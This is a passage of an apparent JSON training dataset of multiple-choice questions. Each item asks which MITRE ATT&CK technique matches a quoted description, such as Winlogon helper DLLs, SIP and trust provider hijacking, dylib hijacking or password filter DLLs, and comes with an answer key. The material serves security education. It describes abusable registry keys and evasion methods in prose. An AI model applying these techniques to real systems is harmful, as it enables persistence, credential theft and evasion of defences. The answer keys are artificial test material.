    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software\\\\Wow6432Node\\\\\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon. \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: \n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.\nA. Boot or Logon Autostart Execution: Winlogon Helper DLL, B. Content Injection, C. Subvert Trust Controls: Code Signing Policy Modification, D. Disk Wipe: Disk Structure Wipe",
    "context": "",
    "output": "A. Boot or Logon Autostart Execution: Winlogon Helper DLL",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software\\\\Wow6432Node\\\\\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon. \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: \n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",
      "options": "A. Boot or Logon Autostart Execution: Winlogon Helper DLL, B. Content Injection, C. Subvert Trust Controls: Code Signing Policy Modification, D. Disk Wipe: Disk Structure Wipe",
      "choice": "A. Boot or Logon Autostart Execution: Winlogon Helper DLL",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: An adversary may use legitimate desktop support and the technique to establish an interactive command and control channel to target systems within networks. These services, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.\n\nRemote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary-controlled system.\n \nAdversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nInstallation of many the technique may also include persistence (e.g., the software's installation routine creates a Windows Service). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome\u2019s Remote Desktop).\nA. Indicator Removal: Clear Mailbox Data, B. Remote Access Software, C. Pre-OS Boot: TFTP Boot, D. Proxy: Domain Fronting",
    "context": "",
    "output": "B. Remote Access Software",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: An adversary may use legitimate desktop support and the technique to establish an interactive command and control channel to target systems within networks. These services, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.\n\nRemote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary-controlled system.\n \nAdversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nInstallation of many the technique may also include persistence (e.g., the software's installation routine creates a Windows Service). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome\u2019s Remote Desktop).",
      "options": "A. Indicator Removal: Clear Mailbox Data, B. Remote Access Software, C. Pre-OS Boot: TFTP Boot, D. Proxy: Domain Fronting",
      "choice": "B. Remote Access Software",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.\n\nAdversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where \"command list\" will be executed when \"signals\" are received.\n\nPossible answers:\nA. Search Open Technical Databases: Digital Certificates, B. Credentials from Password Stores: Keychain, C. Event Triggered Execution: Trap, D. Remote Services: Windows Remote Management",
    "context": "",
    "output": "C. Event Triggered Execution: Trap",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.\n\nAdversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where \"command list\" will be executed when \"signals\" are received.",
      "options": "A. Search Open Technical Databases: Digital Certificates, B. Credentials from Password Stores: Keychain, C. Event Triggered Execution: Trap, D. Remote Services: Windows Remote Management",
      "choice": "C. Event Triggered Execution: Trap",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode  digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,   which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. \n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs)  to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  ) and are identified by globally unique identifiers (GUIDs). \n\nSimilar to Code Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: \n\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file\u2019s real signature, an adversary can apply an acceptable signature value to all files using that SIP  (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function, which validates a file\u2019s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP  (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code> that point to the DLL providing a trust provider\u2019s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP\u2019s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n* **Note:** The above hijacks are also possible without modifying the Registry via DLL Search Order Hijacking.\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation.\nA. Subvert Trust Controls: SIP and Trust Provider Hijacking, B. Obfuscated Files or Information: Embedded Payloads, C. Debugger Evasion, D. Command and Scripting Interpreter: PowerShell\nAnswer:",
    "context": "",
    "output": "A. Subvert Trust Controls: SIP and Trust Provider Hijacking",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode  digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,   which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. \n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs)  to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  ) and are identified by globally unique identifiers (GUIDs). \n\nSimilar to Code Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: \n\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file\u2019s real signature, an adversary can apply an acceptable signature value to all files using that SIP  (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function, which validates a file\u2019s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP  (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code> that point to the DLL providing a trust provider\u2019s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP\u2019s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n* **Note:** The above hijacks are also possible without modifying the Registry via DLL Search Order Hijacking.\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation.",
      "options": "A. Subvert Trust Controls: SIP and Trust Provider Hijacking, B. Obfuscated Files or Information: Embedded Payloads, C. Debugger Evasion, D. Command and Scripting Interpreter: PowerShell",
      "choice": "A. Subvert Trust Controls: SIP and Trust Provider Hijacking",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents. These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.\n\nScripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e \"script here\"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.\n\nAppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS Native APIs\u00a0<code>NSAppleScript</code>\u00a0or\u00a0<code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.\n\nAdversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute Native APIs, which otherwise would require compilation and execution in a mach-O binary file format. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via Python.\n\nPossible answers:\nA. Modify Authentication Process: Reversible Encryption, B. Unsecured Credentials: Bash History, C. Automated Exfiltration: Traffic Duplication, D. Command and Scripting Interpreter: AppleScript",
    "context": "",
    "output": "D. Command and Scripting Interpreter: AppleScript",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents. These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.\n\nScripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e \"script here\"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.\n\nAppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS Native APIs\u00a0<code>NSAppleScript</code>\u00a0or\u00a0<code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.\n\nAdversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute Native APIs, which otherwise would require compilation and execution in a mach-O binary file format. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via Python.",
      "options": "A. Modify Authentication Process: Reversible Encryption, B. Unsecured Credentials: Bash History, C. Automated Exfiltration: Traffic Duplication, D. Command and Scripting Interpreter: AppleScript",
      "choice": "D. Command and Scripting Interpreter: AppleScript",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Answer which mitre technique is related to the description: Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.\nA. Non-Application Layer Protocol, B. Obtain Capabilities: Tool, C. Data Encoding: Non-Standard Encoding, D. Hijack Execution Flow: COR_PROFILER\nAnswer:",
    "context": "",
    "output": "C. Data Encoding: Non-Standard Encoding",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.",
      "options": "A. Non-Application Layer Protocol, B. Obtain Capabilities: Tool, C. Data Encoding: Non-Standard Encoding, D. Hijack Execution Flow: COR_PROFILER",
      "choice": "C. Data Encoding: Non-Standard Encoding",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).\n\nOptions:\nA. Command and Scripting Interpreter: PowerShell, B. Modify Authentication Process: Domain Controller Authentication, C. Subvert Trust Controls: Code Signing, D. Hijack Execution Flow: KernelCallbackTable",
    "context": "",
    "output": "A. Command and Scripting Interpreter: PowerShell",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
      "options": "A. Command and Scripting Interpreter: PowerShell, B. Modify Authentication Process: Domain Controller Authentication, C. Subvert Trust Controls: Code Signing, D. Hijack Execution Flow: KernelCallbackTable",
      "choice": "A. Command and Scripting Interpreter: PowerShell",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path. Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.\nA. Permission Groups Discovery: Domain Groups, B. Automated Exfiltration: Traffic Duplication, C. Hijack Execution Flow: Dynamic Linker Hijacking, D. Hijack Execution Flow: Dylib Hijacking\nAnswer:",
    "context": "",
    "output": "D. Hijack Execution Flow: Dylib Hijacking",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path. Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.",
      "options": "A. Permission Groups Discovery: Domain Groups, B. Automated Exfiltration: Traffic Duplication, C. Hijack Execution Flow: Dynamic Linker Hijacking, D. Hijack Execution Flow: Dylib Hijacking",
      "choice": "D. Hijack Execution Flow: Dylib Hijacking",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nSymmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. \n\nNetwork protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).\n\nA. OS Credential Dumping: Security Account Manager, B. Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol, C. Forge Web Credentials: SAML Tokens, D. Network Denial of Service\nAnswer:",
    "context": "",
    "output": "B. Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nSymmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. \n\nNetwork protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).",
      "options": "A. OS Credential Dumping: Security Account Manager, B. Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol, C. Forge Web Credentials: SAML Tokens, D. Network Denial of Service",
      "choice": "B. Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.\nA. System Network Configuration Discovery, B. Modify Authentication Process: Password Filter DLL, C. Gather Victim Network Information: DNS, D. Impair Defenses: Safe Mode Boot\nAnswer:",
    "context": "",
    "output": "B. Modify Authentication Process: Password Filter DLL",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.",
      "options": "A. System Network Configuration Discovery, B. Modify Authentication Process: Password Filter DLL, C. Gather Victim Network Information: DNS, D. Impair Defenses: Safe Mode Boot",
      "choice": "B. Modify Authentication Process: Password Filter DLL",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.  It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>).  An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths.\n\nPossible answers:\nA. Masquerading: Rename System Utilities, B. Unsecured Credentials: Bash History, C. Develop Capabilities, D. Masquerading",
    "context": "",
    "output": "A. Masquerading: Rename System Utilities",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.  It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>).  An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths.",
      "options": "A. Masquerading: Rename System Utilities, B. Unsecured Credentials: Bash History, C. Develop Capabilities, D. Masquerading",
      "choice": "A. Masquerading: Rename System Utilities",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions. Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.\n\nA. Exploitation for Credential Access, B. Obfuscated Files or Information: Stripped Payloads, C. Process Injection: VDSO Hijacking, D. Data Staged\nAnswer:",
    "context": "",
    "output": "A. Exploitation for Credential Access",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions. Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
      "options": "A. Exploitation for Credential Access, B. Obfuscated Files or Information: Stripped Payloads, C. Process Injection: VDSO Hijacking, D. Data Staged",
      "choice": "A. Exploitation for Credential Access",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
